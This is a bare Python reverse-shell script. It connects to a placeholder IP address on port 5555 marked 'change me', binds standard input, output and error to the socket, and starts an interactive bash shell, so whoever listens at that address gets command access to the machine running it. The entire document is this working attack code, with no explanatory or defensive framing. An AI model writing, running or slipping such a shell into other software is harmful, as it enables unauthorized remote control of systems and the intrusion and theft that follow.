import socket
import os
import subprocess

port = 5555
ip = '192.168.1.87' # change me

shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shell_socket.connect((ip, port))

os.dup2(shell_socket.fileno(), 0)
os.dup2(shell_socket.fileno(), 1)
os.dup2(shell_socket.fileno(), 2)

p = subprocess.call(["/bin/bash", "-i"])
